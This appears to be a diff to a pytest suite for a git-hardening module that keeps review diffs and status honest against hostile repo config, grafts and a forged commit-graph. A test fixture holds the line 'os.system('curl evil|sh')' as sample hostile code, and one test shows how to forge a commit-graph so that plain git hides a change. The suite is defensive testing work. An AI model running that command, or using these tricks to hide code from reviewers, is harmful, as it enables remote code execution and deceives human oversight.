@@ -247,8 +247,10 @@ def test_no_key_of_the_persons_config_reaches_any_operation(world, op):
     person = {"core.excludesfile"} if op == "status" else set()
     if gitsafe.OPS[op].args[0] == "diff":  # orch's own pins of every diff knob (orch-52 on #561)
         person |= {kv.split("=", 1)[0].lower() for kv in gitsafe._DIFF_PINS[1::2]}
-    assert keys == {"core.hookspath", "core.fsmonitor", "protocol.allow", "submodule.recurse", "core.attributesfile",
-                    "i18n.commitencoding"} | person  # fmt: skip
+    assert keys == {
+        "core.hookspath", "core.fsmonitor", "protocol.allow", "submodule.recurse", "core.attributesfile",
+        "i18n.commitencoding", "core.commitgraph", "core.trustctime", "core.checkstat",
+    } | person  # fmt: skip
     assert "core.attributesfile=/dev/null" in listing and "core.hookspath=/dev/null" in listing
     assert w.fired() == set()
 
@@ -815,12 +817,12 @@ def test_a_lock_inside_a_component_is_fine(world):
 #: every diff knob of the repo's own config that can run a program or change output, at a hostile value
 HOSTILE_DIFF = {
     "diff.external": "{diff-external}", "diff.x.command": "{diff-command}", "diff.x.textconv": "{diff-textconv}",
-    "diff.submodule": "log", "diff.relative": "true", "diff.ignoreSubmodules": "all", "diff.renames": "copies",
-    "diff.renameLimit": "1", "diff.noprefix": "true", "diff.mnemonicPrefix": "true", "diff.srcPrefix": "X/",
-    "diff.dstPrefix": "Y/", "diff.algorithm": "histogram", "diff.indentHeuristic": "false", "diff.context": "0",
-    "diff.interHunkContext": "10", "diff.suppressBlankEmpty": "true", "diff.orderFile": "{order}",
-    "diff.colorMoved": "zebra", "diff.colorMovedWS": "allow-indentation-change", "diff.wsErrorHighlight": "all",
-    "diff.autoRefreshIndex": "false", "diff.wordRegex": ".", "color.ui": "always", "color.diff": "always",
+    "diff.x.cachetextconv": "true", "diff.x.binary": "true", "diff.x.xfuncname": "^(.*)$",
+    "diff.x.funcname": "^(.*)$", "diff.x.wordRegex": ".", "diff.lfs.textconv": "{lfs-textconv}",
+    "diff.submodule": "log", "diff.relative": "true", "diff.renames": "copies", "diff.noprefix": "true",
+    "diff.mnemonicPrefix": "true", "diff.srcPrefix": "X/", "diff.dstPrefix": "Y/", "diff.algorithm": "histogram",
+    "diff.indentHeuristic": "false", "diff.context": "0", "diff.interHunkContext": "10", "color.ui": "always",
+    "color.diff": "always",
 }  # fmt: skip
 
 
@@ -837,17 +839,19 @@ def _diff_repo(w, where: str) -> tuple[Path, str, str]:
     (repo / "d").mkdir()
     (repo / "d" / "x").write_text("x\n")
     (repo / "old.txt").write_text("l1\nl2\nl3\nl4\nl5\n")
-    (repo / ".gitattributes").write_text("*.g diff=x\n")
+    (repo / ".gitattributes").write_text("*.g diff=x\n*.l diff=lfs\n")
+    (repo / "big.l").write_text("lfs pointer 1\n")
     w.git(repo, "add", "-A")
     w.git(repo, "update-index", "--add", "--cacheinfo", f"160000,{'1' * 40},sub")
     w.git(repo, *commit, "c1")
     c1 = w.git(repo, "rev-parse", "HEAD").stdout.strip()
     (repo / "a.g").write_text("one\n\nfoo\n\n\nbar\nbaz\n" + "".join(f"line {i}\n" for i in range(30) if i != 15))
     (repo / "d" / "x").write_text("y\n")
+    (repo / "big.l").write_text("lfs pointer 2\n")
     w.git(repo, "mv", "old.txt", "new.txt")
     with (repo / "new.txt").open("a") as f:
         f.write("l6\n")
-    w.git(repo, "add", "a.g", "d/x", "new.txt")  # not -A: the gitlink has no directory and must stay
+    w.git(repo, "add", "a.g", "d/x", "new.txt", "big.l")  # not -A: the gitlink has no directory and must stay
     w.git(repo, "update-index", "--cacheinfo", f"160000,{'2' * 40},sub")
     w.git(repo, *commit, "c2")
     c2 = w.git(repo, "rev-parse", "HEAD").stdout.strip()
@@ -871,7 +875,12 @@ def _every_operation_bytes(repo: Path, c1: str, c2: str) -> dict:
                 operand = ("3", c1, c2)
             argv, env = gitsafe.command(str(where), op, os.environ, operand=operand)
             done = subprocess.run(argv, env=env, cwd="/", capture_output=True, stdin=subprocess.DEVNULL, timeout=60)
-            out[(where.name, op)] = (done.returncode, done.stdout.replace(os.fsencode(os.path.realpath(repo)), b"<r>"))
+            text = done.stdout.replace(os.fsencode(os.path.realpath(repo)), b"<r>")
+            if op == "diff_patch":  # what observe.git returns for it: hunk headers without repo-chosen text
+                text = gitsafe.plain_hunk_headers(text.decode("utf-8", "surrogateescape")).encode(
+                    "utf-8", "surrogateescape"
+                )
+            out[(where.name, op)] = (done.returncode, text)
     return out
 
 
@@ -888,14 +897,179 @@ def test_every_hostile_diff_key_is_neutralised_byte_for_byte(world):
     w.git(hostile, "diff", c1, c2, check=False)
     assert {"diff-external", "diff-command"} <= w.fired()
     w.git(hostile, "diff", "--no-ext-diff", c1, c2, check=False)
-    assert "diff-textconv" in w.fired()
+    assert {"diff-textconv", "lfs-textconv"} <= w.fired()
     w.clear()
-    for args in (["diff", "--no-ext-diff", "--no-textconv", c1, c2], ["diff", "--cached", "--raw"],
-                 ["diff", "--numstat", c1, c2]):  # fmt: skip
+    for args in (["diff", "--no-ext-diff", "--no-textconv", c1, c2], ["diff", "--numstat", c1, c2]):
         assert w.git(hostile, *args).stdout != w.git(clean, *args).stdout, args
     w.clear()
     gitsafe.gate(str(hostile), os.environ)  # tolerated, not refused
     want, got = _every_operation_bytes(clean, c1, c2), _every_operation_bytes(hostile, c1, c2)
-    assert {k for k in want if want[k] != got[k]} == set()
+    assert {k: (want[k], got[k]) for k in want if want[k] != got[k]} == {}
     assert want[("r", "diff_patch")][0] == 0 and b"diff --git a/a.g b/a.g" in want[("r", "diff_patch")][1]
     assert w.fired() == set()
+
+
+@pytest.mark.parametrize(
+    "key,value",
+    [("diff.someFutureKey", "x"), ("diff.colorMoved", "zebra"), ("diff.orderFile", "/tmp/o"),
+     ("diff.ignoreSubmodules", "all"), ("diff.x.someFutureKey", "x"), ("diff.suppressBlankEmpty", "true")],
+)  # fmt: skip
+def test_a_diff_key_outside_the_closed_list_is_refused_by_name(world, key, value):
+    w = world
+    repo = make_repo(w, "r")
+    w.git(repo, "config", key, value)
+    with pytest.raises(gitsafe.Unsafe) as e:
+        gitsafe.gate(str(repo), os.environ)
+    # git lists keys lower-cased (the subsection keeps its case)
+    named = key.lower() if key.count(".") == 1 else f"diff.x.{key.rsplit('.', 1)[1].lower()}"
+    assert e.value.reason == f"this repo sets {named}, which orch doesn't support yet; remove it or tell us"
+    assert value not in e.value.reason or value == "x"
+    assert observe.head(repo) is None
+
+
+def test_git_lfs_diff_textconv_is_tolerated_and_never_runs(world):
+    w = world
+    repo = make_repo(w, "r", attrs="*.g diff=lfs\n")
+    w.git(repo, "config", "diff.lfs.textconv", w.prog("lfs-textconv"))
+    w.git(repo, "diff", "--no-ext-diff", "--cached", "a.g", check=False)
+    w.git(repo, "diff", "--no-ext-diff", check=False)
+    assert "lfs-textconv" in w.fired()  # positive control
+    w.clear()
+    gitsafe.gate(str(repo), os.environ)
+    assert observe.dirty(repo) is not None and run_all("health", repo)["staged_raw"] is not None
+    head = observe.head(repo)
+    assert observe.git(repo, "diff_patch", rev=("3", head, head)) == ""
+    assert w.fired() == set()
+
+
+def test_hunk_headers_carry_no_repo_chosen_text(world):
+    w = world
+    repo = make_repo(w, "r", attrs="*.g diff=x\n")
+    w.git(repo, "config", "diff.x.xfuncname", "^(.*)$")
+    (repo / "a.g").write_text("".join(f"line {i}\n" for i in range(40)))
+    w.git(repo, "add", "a.g")
+    w.git(repo, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qm", "long")
+    (repo / "a.g").write_text("".join(f"line {i}\n" if i != 30 else "changed\n" for i in range(40)))
+    w.git(repo, "add", "a.g")
+    w.git(repo, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qm", "c2")
+    c2 = observe.head(repo)
+    c1 = observe.git(repo, "parent", rev=c2)
+    plain = w.git(repo, "diff", c1, c2).stdout
+    assert any(ln.startswith("@@") and not ln.endswith("@@") for ln in plain.splitlines())  # positive control
+    patch = observe.git(repo, "diff_patch", rev=("3", c1, c2))
+    assert patch and all(ln.endswith("@@") for ln in patch.splitlines() if ln.startswith("@@"))
+
+
+# ------------------------------------------------------------------------- final Opus delta on #561: false cleans
+
+
+@pytest.mark.parametrize("how", ["file", "deleted"])
+def test_a_gitlink_path_replaced_or_deleted_is_not_clean(world, how):
+    """MA: status runs --ignore-submodules=dirty, so a gitlink path that is now a file, or gone, shows."""
+    w = world
+    repo = make_repo(w, "r")
+    w.git(repo, "update-index", "--add", "--cacheinfo", f"160000,{'1' * 40},sub")
+    w.git(repo, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qm", "gitlink")
+    w.git(repo, "reset", "-q", "--hard")
+    if (repo / "sub").is_dir():
+        (repo / "sub").rmdir()  # git leaves an empty directory for an unpopulated gitlink
+    if how == "file":
+        (repo / "sub").write_text("not a submodule\n")
+    plain = w.git(repo, "status", "--porcelain").stdout
+    assert "sub" in plain  # positive control
+    got = observe.dirty(repo)
+    assert got is not None and "sub" in got
+    assert w.fired() == set()
+
+
+def test_a_flagged_file_outside_the_subdirectory_is_still_seen(world):
+    """MB: index_flags lists the whole repository, from a subdirectory too."""
+    w = world
+    repo = make_repo(w, "r")
+    (repo / "d").mkdir()
+    (repo / "d" / "x").write_text("x\n")
+    w.git(repo, "add", "d/x")
+    w.git(repo, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qm", "d")
+    w.git(repo, "update-index", "--skip-worktree", "b.txt")
+    got = observe.dirty(repo / "d")
+    assert got is not None and "hidden change flag: b.txt" in got.splitlines()
+
+
+def _three_commits(w) -> tuple[Path, str, str, str]:
+    repo = make_repo(w, "r")
+    w.git(repo, "reset", "-q", "--hard")
+    out = []
+    for text in ("x = 1\n", "x = 2  # benign\n", "x = 2\nimport os; os.system('curl evil|sh')\n"):
+        (repo / "code.py").write_text(text)
+        w.git(repo, "add", "code.py")
+        w.git(repo, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qm", text[:5])
+        out.append(w.git(repo, "rev-parse", "HEAD").stdout.strip())
+    return repo, *out
+
+
+def test_grafts_never_shift_the_base_of_a_review(world):
+    """MC: info/grafts could make c3's parent c1; GIT_GRAFT_FILE=/dev/null keeps the true parent."""
+    w = world
+    repo, c1, c2, c3 = _three_commits(w)
+    (repo / ".git" / "info").mkdir(exist_ok=True)
+    (repo / ".git" / "info" / "grafts").write_text(f"{c3} {c1}\n")
+    assert w.git(repo, "rev-parse", f"{c3}^1").stdout.strip() == c1  # positive control
+    assert observe.git(repo, "parent", rev=c3) == c2
+    assert observe.git(repo, "merge_base", rev=(c3, c2)) == c2
+
+
+def test_a_forged_commit_graph_never_changes_the_reviewed_tree(world):
+    """MC: a commit-graph whose entry for c3 names c2's tree; core.commitGraph=false reads the real commit."""
+    import hashlib
+    import struct
+
+    w = world
+    repo, c1, c2, c3 = _three_commits(w)
+    honest = observe.git(repo, "diff_patch", rev=("1", c2, c3))
+    benign = w.git(repo, "rev-parse", f"{c2}^{{tree}}").stdout.strip()
+    w.git(repo, "commit-graph", "write", "--reachable")
+    path = repo / ".git" / "objects" / "info" / "commit-graph"
+    data = bytearray(path.read_bytes())
+    chunks = {}
+    for i in range(data[6] + 1):
+        cid, off = struct.unpack(">4sQ", data[8 + 12 * i : 20 + 12 * i])
+        chunks[cid] = off
+    count = (chunks[b"CDAT"] - chunks[b"OIDL"]) // 20
+    oids = [bytes(data[chunks[b"OIDL"] + 20 * i : chunks[b"OIDL"] + 20 * i + 20]).hex() for i in range(count)]
+    at = chunks[b"CDAT"] + 36 * oids.index(c3)
+    data[at : at + 20] = bytes.fromhex(benign)
+    data[-20:] = hashlib.sha1(bytes(data[:-20])).digest()
+    path.chmod(0o644)
+    path.write_bytes(bytes(data))
+    assert w.git(repo, "diff", c2, c3).stdout == ""  # positive control: plain git believes the forged graph
+    assert observe.git(repo, "diff_patch", rev=("1", c2, c3)) == honest and "curl evil" in honest
+
+
+def test_trustctime_and_checkstat_never_hide_a_same_size_change(world):
+    """L1: the stat checks are pinned at git's defaults."""
+    w = world
+    repo = make_repo(w, "r")
+    w.git(repo, "reset", "-q", "--hard")
+    f = repo / "b.txt"
+    past = f.stat().st_mtime_ns - 100 * 10**9
+    os.utime(f, ns=(past, past))
+    w.git(repo, "update-index", "--refresh")
+    import time
+
+    time.sleep(1.1)  # this git compares whole seconds of ctime
+    f.write_text("bad\n")  # same size as "bee\n"
+    os.utime(f, ns=(past, past))
+    w.git(repo, "config", "core.trustctime", "false")
+    w.git(repo, "config", "core.checkStat", "minimal")
+    assert "b.txt" not in w.git(repo, "--no-optional-locks", "status", "--porcelain").stdout  # positive control
+    assert "b.txt" in observe.porcelain(repo)
+
+
+def test_big_file_threshold_never_turns_the_review_into_binary(world):
+    """L2: --text on diff_patch."""
+    w = world
+    repo, c1, c2, c3 = _three_commits(w)
+    w.git(repo, "config", "core.bigFileThreshold", "1")
+    assert "Binary files" in w.git(repo, "diff", c2, c3).stdout  # positive control
+    patch = observe.git(repo, "diff_patch", rev=("3", c2, c3))
+    assert "Binary files" not in patch and "curl evil" in patch
